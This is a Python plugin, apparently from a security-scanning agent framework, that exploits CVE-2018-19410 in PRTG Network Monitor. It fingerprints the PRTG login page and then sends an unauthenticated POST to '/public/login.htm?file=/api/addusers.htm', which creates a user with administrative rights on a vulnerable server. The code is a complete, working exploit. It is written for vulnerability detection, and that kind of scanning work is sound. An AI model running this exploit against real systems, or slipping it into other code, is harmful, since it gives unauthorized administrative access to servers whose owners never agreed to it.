"""Agent Asteroid implementation for CVE-2018-19410"""

import datetime
import json
import logging

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = (
    "PRTG Network Monitor Authentication Bypass & Local File Inclusion"
)
VULNERABILITY_REFERENCE = "CVE-2018-19410"
VULNERABILITY_DESCRIPTION = """
A vulnerability in PRTG Network Monitor allows unauthenticated remote attackers to create users
with administrative privileges by exploiting an improper file inclusion mechanism in `/public/login.htm`.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
TARGET_ENDPOINT = "/public/login.htm?file=/api/addusers.htm"
PRTG_INDICATOR = "PRTG Network Monitor"
LOGIN_ENDPOINT = "/public/login.htm"
TEST_USERNAME = "ostorlab_user"


@exploits_registry.register
class PRTGAuthBypassExploit(webexploit.WebExploit):
    """
    CVE-2018-19410: PRTG Network Monitor Authentication Bypass & LFI

    Exploit allows remote attackers to create privileged users without authentication.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target is a PRTG Network Monitor instance.
        """
        try:
            response = self.session.get(
                f"{target.origin}{LOGIN_ENDPOINT}",
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            return PRTG_INDICATOR in response.text
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Attempt to create a test user via authentication bypass.
        """
        vulnerabilities: list[definitions.Vulnerability] = []

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "*/*",
            "Accept-Language": "en-GB,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": f"{target.origin}",
            "Connection": "close",
            "Referer": f"{target.origin}{LOGIN_ENDPOINT}",
        }

        data = {"id": "200", "users": TEST_USERNAME}

        try:
            response = self.session.post(
                f"{target.origin}{TARGET_ENDPOINT}",
                headers=headers,
                data=data,
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )

            if 200 <= response.status_code < 400:
                logging.info("Response: %s", response.text)
                vuln = self.create_vulnerability(target)
                vulnerabilities.append(vuln)
            else:
                logging.warning("Target did not respond as expected.")
        except (requests_exceptions.RequestException, json.JSONDecodeError) as e:
            logging.error("Error during exploit attempt: %s", e)

        return vulnerabilities
